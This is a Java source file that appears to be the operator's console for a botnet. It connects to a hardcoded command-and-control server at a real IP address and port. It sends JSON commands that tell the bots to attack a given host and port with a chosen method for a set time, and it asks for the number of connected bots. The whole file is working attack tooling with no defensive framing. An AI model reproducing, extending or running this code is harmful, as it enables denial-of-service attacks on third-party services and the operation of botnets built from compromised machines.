package sg.Chearstern;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class Main {
    private Socket socket;
    private BufferedReader in;
    private PrintWriter out;
    private boolean running = true;

    public static void main(String[] args) {
        String serverIp = "65.108.224.31";
        int serverPort = 26772;

        Main client = new Main();
        client.start(serverIp, serverPort);
    }

    public void start(String serverIp, int serverPort) {
        try {
            // Connect to server
            socket = new Socket(serverIp, serverPort);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);

            // Start a thread to listen for server responses
            new Thread(this::listenForResponses).start();

            // Process terminal commands
            Scanner scanner = new Scanner(System.in);
            System.out.println("Client connected to " + serverIp + ":" + serverPort);
            System.out.println("Available commands: ");
            System.out.println("attack <host> <port> <method> <duration>");
            System.out.println("numBots");
            System.out.println("exit");

            while (running) {
                String command = scanner.nextLine();
                processCommand(command);
            }

            scanner.close();
            socket.close();

        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    private void processCommand(String command) {
        try {
            String[] parts = command.split(" ");
            String action = parts[0].toLowerCase();

            JSONObject json = new JSONObject();

            switch (action) {
                case "attack":
                    if (parts.length < 5) {
                        System.out.println("Usage: attack <host> <port> <method> <duration>");
                        return;
                    }
                    json.put("action", "attack");
                    json.put("host", parts[1]);
                    json.put("port", Integer.parseInt(parts[2]));
                    json.put("method", parts[3]);
                    json.put("duration", Integer.parseInt(parts[4]));
                    out.println(json.toString());
                    System.out.println("Attack command sent");
                    break;

                case "numbots":
                    json.put("action", "numBots");
                    out.println(json.toString());
                    System.out.println("Requesting bot count...");
                    break;

                case "exit":
                    running = false;
                    System.out.println("Exiting...");
                    break;

                default:
                    System.out.println("Unknown command. Available commands: attack, numBots, exit");
                    break;
            }
        } catch (Exception e) {
            System.out.println("Error processing command: " + e.getMessage());
        }
    }

    private void listenForResponses() {
        try {
            String response;
            while ((response = in.readLine()) != null) {
                JSONObject json = new JSONObject(response);
                if (json.has("numBots")) {
                    System.out.println("Number of bots: " + json.get("numBots"));
                } else {
                    System.out.println("Server response: " + response);
                }
            }
        } catch (Exception e) {
            if (running) {
                System.out.println("Connection to server lost: " + e.getMessage());
                running = false;
            }
        }
    }
}